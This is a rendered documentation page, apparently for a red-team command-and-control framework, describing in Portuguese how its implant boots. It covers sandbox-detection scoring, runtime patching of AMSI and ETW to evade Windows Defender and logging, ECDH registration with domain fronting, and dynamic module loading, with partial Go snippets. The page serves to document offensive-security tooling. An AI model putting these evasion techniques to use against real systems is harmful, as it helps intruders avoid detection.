+<a class="md-nav__link" href="../../tradecraft/credential-access/registry-hives/">
+<span class="md-ellipsis">
+    
+  
+    Registry Hives
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/kerberoasting/">
+<span class="md-ellipsis">
+    
+  
+    Kerberoasting
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/vault-extraction/">
+<span class="md-ellipsis">
+    
+  
+    Vault Extraction
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/persistence/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_5_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Persistence
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/windows-registry/">
+<span class="md-ellipsis">
+    
+  
+    Windows Registry
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/scheduled-tasks/">
+<span class="md-ellipsis">
+    
+  
+    Scheduled Tasks
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/linux-cron/">
+<span class="md-ellipsis">
+    
+  
+    Linux Cron
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/persistence/macos-launchd/">
+<span class="md-ellipsis">
+    
+  
+    macOS Launchd
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_6_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Lateral Movement
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/port-forwarding/">
+<span class="md-ellipsis">
+    
+  
+    Port Forwarding
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/socks-proxy/">
+<span class="md-ellipsis">
+    
+  
+    SOCKS Proxy
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/pivot-chains/">
+<span class="md-ellipsis">
+    
+  
+    Pivot Chains
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/lateral-movement/remote-execution/">
+<span class="md-ellipsis">
+    
+  
+    Remote Execution
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_7" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../modules/">
+<span class="md-ellipsis">
+    
+  
+    Module Catalog
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_7">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Module Catalog
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/shell/">
+<span class="md-ellipsis">
+    
+  
+    Shell
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/fileops/">
+<span class="md-ellipsis">
+    
+  
+    File Operations
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/recon/">
+<span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/persist/">
+<span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/lateral/">
+<span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/credential/">
+<span class="md-ellipsis">
+    
+  
+    Credentials
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../modules/exfil/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_8" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../api/">
+<span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_8_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_8">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    API Reference
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="internos-do-implant">Internos do Implant<a class="headerlink" href="#internos-do-implant" title="Permanent link">¶</a></h1>
+<p>Esta pagina documenta o comportamento interno do <code>wolfgang-implant</code> — desde o momento em que o binario e executado no target ate o check-in loop estavel. Cada fase e documentada com o codigo fonte correspondente.</p>
+<h2 id="boot-sequence-completo">Boot Sequence Completo<a class="headerlink" href="#boot-sequence-completo" title="Permanent link">¶</a></h2>
+<pre class="mermaid"><code>flowchart TD
+    START["main()"] --&gt; P1
+
+    subgraph P1["Fase 1: Auto-Evasion"]
+        E1{AutoSandbox?}
+        E1 --&gt;|"Sim"| SB["runSandboxCheck()<br/>Score-based detection"]
+        E1 --&gt;|"Nao"| E2
+        SB --&gt;|"Score &gt; threshold"| ABORT["os.Exit(0)<br/>Exit limpo, sem error code"]
+        SB --&gt;|"Score OK"| E2
+
+        E2{Windows?}
+        E2 --&gt;|"Sim"| AMSI{AutoAMSI?}
+        AMSI --&gt;|"Sim"| AMSI_PATCH["AMSIBypass.Execute()<br/>Patch amsi.dll"]
+        AMSI --&gt;|"Nao"| ETW
+        AMSI_PATCH --&gt; ETW{AutoETW?}
+        ETW --&gt;|"Sim"| ETW_PATCH["ETWBypass.Execute()<br/>Patch ntdll"]
+        ETW --&gt;|"Nao"| P2_START
+        ETW_PATCH --&gt; P2_START
+
+        E2 --&gt;|"Nao"| P2_START["Evasion concluida"]
+    end
+
+    P2_START --&gt; P2
+
+    subgraph P2["Fase 2: Transport Chain"]
+        TC["BuildTransportChain(cfg)"]
+        TC --&gt; PRIO{TransportPriority<br/>configurada?}
+        PRIO --&gt;|"Sim"| BUILD["Constroi chain na ordem<br/>ex: https, dns, ws"]
+        PRIO --&gt;|"Nao"| SINGLE["Chain de 1 transport<br/>(cfg.Transport)"]
+        BUILD --&gt; ENSURE["Garante pelo menos HTTPS"]
+        SINGLE --&gt; ENSURE
+    end
+
+    ENSURE --&gt; P3
+
+    subgraph P3["Fase 3: Registration"]
+        REG_LOOP["Loop de registration<br/>max 10 tentativas"]
+        REG_LOOP --&gt; TLS_CLIENT["NewTLSClient(cfg)<br/>InsecureSkipVerify +<br/>Domain fronting SNI"]
+        TLS_CLIENT --&gt; ECDH["Register(cfg, client)"]
+        ECDH --&gt; KEYGEN["GenerateEphemeralKeypair()"]
+        KEYGEN --&gt; SYSINFO["Coleta: hostname, OS, arch,<br/>username, IPs"]
+        SYSINFO --&gt; POST["POST /register<br/>{metadata + ephemeral pubkey}"]
+        POST --&gt; VERIFY["Verifica server pubkey<br/>contra pinned key"]
+        VERIFY --&gt; DERIVE["DeriveSharedSecret()<br/>DeriveSessionKey()"]
+        DERIVE --&gt; SESSION["AgentSession{<br/>AgentID, SessionKey}"]
+
+        REG_LOOP --&gt;|"Falha"| RETRY["Backoff: 2s + random 0-3s"]
+        RETRY --&gt; REG_LOOP
+        REG_LOOP --&gt;|"10 falhas"| EXIT["os.Exit(1)"]
+    end
+
+    SESSION --&gt; P4
+
+    subgraph P4["Fase 4: Graceful Shutdown"]
+        SIGNAL["signal.NotifyContext()<br/>SIGINT + SIGTERM"]
+    end
+
+    SIGNAL --&gt; P5
+
+    subgraph P5["Fase 5: Module System"]
+        REGISTRY["module.NewRegistry()"]
+        REGISTRY --&gt; REG_ALL["registerAllModules(registry)<br/>27+ modulos, filtered by OS"]
+        REG_ALL --&gt; EXECUTOR["module.NewExecutor(registry)"]
+        EXECUTOR --&gt; DYN{DynamicModules<br/>habilitado?}
+        DYN --&gt;|"Sim"| LOADER["moduleloader.NewLoader()<br/>Download + cache + reflect"]
+        DYN --&gt;|"Nao"| BRIDGE
+        LOADER --&gt; BRIDGE["Bridge function:<br/>task -&gt; executor -&gt; result"]
+    end
+
+    BRIDGE --&gt; P6
+
+    subgraph P6["Fase 6: Pipe Relay"]
+        PIPE{PipeListener<br/>configurado?}
+        PIPE --&gt;|"Sim"| RELAY["go startPipeRelay(ctx)<br/>Goroutine separada"]
+        PIPE --&gt;|"Nao"| P7_START
+    end
+
+    RELAY --&gt; P7_START
+    P7_START --&gt; P7
+
+    subgraph P7["Fase 7: Check-in Loop"]
+        RECON["NewReconnector(cfg, chain)"]
+        RECON --&gt; LOOP["CheckInLoop(ctx, cfg,<br/>session, recon, bridge)"]
+    end
+</code></pre>
+<h2 id="fase-1-auto-evasion">Fase 1: Auto-Evasion<a class="headerlink" href="#fase-1-auto-evasion" title="Permanent link">¶</a></h2>
+<p>A evasion chain roda <strong>antes de qualquer atividade de rede</strong>. Isso e critico — se o implant gera alertas antes de se registrar, o operador nunca tera controle.</p>
+<h3 id="sandbox-detection">Sandbox Detection<a class="headerlink" href="#sandbox-detection" title="Permanent link">¶</a></h3>
+<p>O sandbox check usa um <strong>sistema de pontuacao</strong>. Multiplos indicadores sao verificados, cada um contribuindo pontos. Se o score total excede o threshold (default 40), o implant aborta com <code>os.Exit(0)</code> — exit code zero para nao alertar monitoramento.</p>
+<p>Indicadores tipicos:</p>
+<ul>
+<li>Contagem de CPUs (VMs geralmente tem 1-2)</li>
+<li>Quantidade de RAM (sandboxes geralmente &lt;4GB)</li>
+<li>Presenca de processos de analise (procmon, wireshark, ida)</li>
+<li>Resolucao de tela</li>
+<li>Uptime do sistema (sandboxes reiniciam frequentemente)</li>
+<li>Presenca de artefatos de VM (VMware Tools, VBox Guest Additions)</li>
+</ul>
+<h3 id="amsi-e-etw-bypass-windows">AMSI e ETW Bypass (Windows)<a class="headerlink" href="#amsi-e-etw-bypass-windows" title="Permanent link">¶</a></h3>
+<p>No Windows, o implant opcionalmente aplica patches em runtime:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1">// cmd/implant/evasion_windows.go</span>
+<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">initEvasion</span><span class="p">(</span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">AutoAMSI</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">        </span><span class="nx">bypass</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">evasion</span><span class="p">.</span><span class="nx">NewAMSIBypass</span><span class="p">()</span>
+<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">        </span><span class="nx">args</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">module</span><span class="p">.</span><span class="nx">ModuleArgs</span><span class="p">{</span><span class="nx">Raw</span><span class="p">:</span><span class="w"> </span><span class="s">`{"action":"patch","strategy":"auto"}`</span><span class="p">}</span>
+<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">        </span><span class="nx">bypass</span><span class="p">.</span><span class="nx">Execute</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span>
+<a href="#__codelineno-0-7" id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-0-8" id="__codelineno-0-8" name="__codelineno-0-8"></a>
+<a href="#__codelineno-0-9" id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">AutoETW</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-0-10" id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">        </span><span class="nx">bypass</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">evasion</span><span class="p">.</span><span class="nx">NewETWBypass</span><span class="p">()</span>
+<a href="#__codelineno-0-11" id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="w">        </span><span class="nx">args</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">module</span><span class="p">.</span><span class="nx">ModuleArgs</span><span class="p">{</span><span class="nx">Raw</span><span class="p">:</span><span class="w"> </span><span class="s">`{"action":"patch","strategy":"auto"}`</span><span class="p">}</span>
+<a href="#__codelineno-0-12" id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="w">        </span><span class="nx">bypass</span><span class="p">.</span><span class="nx">Execute</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span>
+<a href="#__codelineno-0-13" id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-0-14" id="__codelineno-0-14" name="__codelineno-0-14"></a>
+<a href="#__codelineno-0-15" id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">AutoSandbox</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-0-16" id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="w">        </span><span class="nx">runSandboxCheck</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-0-17" id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-0-18" id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
+<a href="#__codelineno-0-19" id="__codelineno-0-19" name="__codelineno-0-19"></a><span class="p">}</span>
+</code></pre></div>
+<p><strong>AMSI (Anti-Malware Scan Interface):</strong> Patched para evitar que comandos em memoria sejam escaneados pelo Windows Defender.</p>
+<p><strong>ETW (Event Tracing for Windows):</strong> Patched para evitar que atividades do implant sejam logadas em ETW providers.</p>
+<p>Em plataformas nao-Windows, a evasion e no-op:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1">// cmd/implant/evasion.go (build tag: !windows)</span>
+<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">initEvasion</span><span class="p">(</span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">AutoSandbox</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="w">        </span><span class="nx">runSandboxCheck</span><span class="p">(</span><span class="nx">cfg</span><span class="p">)</span>
+<a href="#__codelineno-1-5" id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-1-6" id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="w">    </span><span class="c1">// AMSI/ETW nao existem em Linux/macOS</span>
+<a href="#__codelineno-1-7" id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
+<a href="#__codelineno-1-8" id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="p">}</span>
+</code></pre></div>
+<h2 id="fase-3-registration-com-ecdh">Fase 3: Registration com ECDH<a class="headerlink" href="#fase-3-registration-com-ecdh" title="Permanent link">¶</a></h2>
+<p>A registration e o handshake mais critico. O implant:</p>
+<ol>
+<li><strong>Gera keypair efemero</strong> X25519</li>
+<li><strong>Coleta sysinfo</strong> (hostname, OS, arch, username) usando funcoes platform-specific</li>
+<li><strong>Envia POST /register</strong> com pubkey + metadata</li>
+<li><strong>Verifica key pinning</strong> — se o server retorna uma pubkey diferente da embutida em build time, aborta</li>
+<li><strong>Deriva session key</strong> via ECDH + HKDF</li>
+<li><strong>Descarta chave privada efemera</strong> — forward secrecy</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c1">// cmd/implant/register.go</span>
+<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">Register</span><span class="p">(</span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">,</span><span class="w"> </span><span class="nx">httpClient</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">AgentSession</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="nx">ephemeral</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">GenerateEphemeralKeypair</span><span class="p">()</span>
+<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a>
+<a href="#__codelineno-2-5" id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">    </span><span class="nx">req</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">registrationRequest</span><span class="p">{</span>
+<a href="#__codelineno-2-6" id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="w">        </span><span class="nx">Hostname</span><span class="p">:</span><span class="w">  </span><span class="nx">hostname</span><span class="p">,</span>
+<a href="#__codelineno-2-7" id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="w">        </span><span class="nx">OS</span><span class="p">:</span><span class="w">        </span><span class="nx">runtime</span><span class="p">.</span><span class="nx">GOOS</span><span class="p">,</span>
+<a href="#__codelineno-2-8" id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">        </span><span class="nx">Arch</span><span class="p">:</span><span class="w">      </span><span class="nx">runtime</span><span class="p">.</span><span class="nx">GOARCH</span><span class="p">,</span>
+<a href="#__codelineno-2-9" id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="w">        </span><span class="nx">Username</span><span class="p">:</span><span class="w">  </span><span class="nx">currentUsername</span><span class="p">(),</span>
+<a href="#__codelineno-2-10" id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="w">        </span><span class="nx">PublicKey</span><span class="p">:</span><span class="w"> </span><span class="nx">hex</span><span class="p">.</span><span class="nx">EncodeToString</span><span class="p">(</span><span class="nx">ephemeral</span><span class="p">.</span><span class="nx">Public</span><span class="p">.</span><span class="nx">Bytes</span><span class="p">()),</span>
+<a href="#__codelineno-2-11" id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="w">        </span><span class="c1">// ...</span>
+<a href="#__codelineno-2-12" id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-2-13" id="__codelineno-2-13" name="__codelineno-2-13"></a>
+<a href="#__codelineno-2-14" id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="w">    </span><span class="c1">// POST /register</span>
+<a href="#__codelineno-2-15" id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="w">    </span><span class="nx">resp</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">doHTTPPost</span><span class="p">(</span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ServerURL</span><span class="o">+</span><span class="s">"/register"</span><span class="p">,</span><span class="w"> </span><span class="nx">req</span><span class="p">)</span>
+<a href="#__codelineno-2-16" id="__codelineno-2-16" name="__codelineno-2-16"></a>
+<a href="#__codelineno-2-17" id="__codelineno-2-17" name="__codelineno-2-17"></a><span class="w">    </span><span class="c1">// Key pinning</span>
+<a href="#__codelineno-2-18" id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ServerPublicKey</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">regResp</span><span class="p">.</span><span class="nx">ServerPublicKey</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">ServerPublicKey</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-2-19" id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">"server public key mismatch"</span><span class="p">)</span>
+<a href="#__codelineno-2-20" id="__codelineno-2-20" name="__codelineno-2-20"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-2-21" id="__codelineno-2-21" name="__codelineno-2-21"></a>
+<a href="#__codelineno-2-22" id="__codelineno-2-22" name="__codelineno-2-22"></a><span class="w">    </span><span class="c1">// ECDH</span>
+<a href="#__codelineno-2-23" id="__codelineno-2-23" name="__codelineno-2-23"></a><span class="w">    </span><span class="nx">serverPub</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">ParsePublicKey</span><span class="p">(</span><span class="nx">serverPubBytes</span><span class="p">)</span>
+<a href="#__codelineno-2-24" id="__codelineno-2-24" name="__codelineno-2-24"></a><span class="w">    </span><span class="nx">sharedSecret</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">DeriveSharedSecret</span><span class="p">(</span><span class="nx">ephemeral</span><span class="p">.</span><span class="nx">Private</span><span class="p">,</span><span class="w"> </span><span class="nx">serverPub</span><span class="p">)</span>
+<a href="#__codelineno-2-25" id="__codelineno-2-25" name="__codelineno-2-25"></a><span class="w">    </span><span class="nx">sessionKey</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">DeriveSessionKey</span><span class="p">(</span><span class="nx">sharedSecret</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">regResp</span><span class="p">.</span><span class="nx">AgentID</span><span class="p">))</span>
+<a href="#__codelineno-2-26" id="__codelineno-2-26" name="__codelineno-2-26"></a>
+<a href="#__codelineno-2-27" id="__codelineno-2-27" name="__codelineno-2-27"></a><span class="w">    </span><span class="c1">// ephemeral.Private sai de escopo aqui = forward secrecy</span>
+<a href="#__codelineno-2-28" id="__codelineno-2-28" name="__codelineno-2-28"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">AgentSession</span><span class="p">{</span><span class="nx">AgentID</span><span class="p">:</span><span class="w"> </span><span class="nx">regResp</span><span class="p">.</span><span class="nx">AgentID</span><span class="p">,</span><span class="w"> </span><span class="nx">SessionKey</span><span class="p">:</span><span class="w"> </span><span class="nx">sessionKey</span><span class="p">},</span><span class="w"> </span><span class="kc">nil</span>
+<a href="#__codelineno-2-29" id="__codelineno-2-29" name="__codelineno-2-29"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="retries-com-backoff">Retries com Backoff<a class="headerlink" href="#retries-com-backoff" title="Permanent link">¶</a></h3>
+<p>Se a registration falha, o implant tenta ate 10 vezes com delay crescente:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="kd">const</span><span class="w"> </span><span class="p">(</span>
+<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="w">    </span><span class="nx">maxRegistrationAttempts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">10</span>
+<a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="w">    </span><span class="nx">baseRegistrationDelay</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span>
+<a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="w">    </span><span class="nx">maxRegistrationJitter</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span>
+<a href="#__codelineno-3-5" id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="p">)</span>
+<a href="#__codelineno-3-6" id="__codelineno-3-6" name="__codelineno-3-6"></a>
+<a href="#__codelineno-3-7" id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="k">for</span><span class="w"> </span><span class="nx">attempt</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="nx">attempt</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">maxRegistrationAttempts</span><span class="p">;</span><span class="w"> </span><span class="nx">attempt</span><span class="o">++</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-3-8" id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="w">    </span><span class="nx">session</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">Register</span><span class="p">(</span><span class="nx">cfg</span><span class="p">,</span><span class="w"> </span><span class="nx">client</span><span class="p">)</span>
+<a href="#__codelineno-3-9" id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">break</span><span class="w"> </span><span class="p">}</span>
+<a href="#__codelineno-3-10" id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="w">    </span><span class="nx">jitter</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">(</span><span class="nx">rand</span><span class="p">.</span><span class="nx">Int63n</span><span class="p">(</span><span class="nb">int64</span><span class="p">(</span><span class="nx">maxRegistrationJitter</span><span class="p">)))</span>
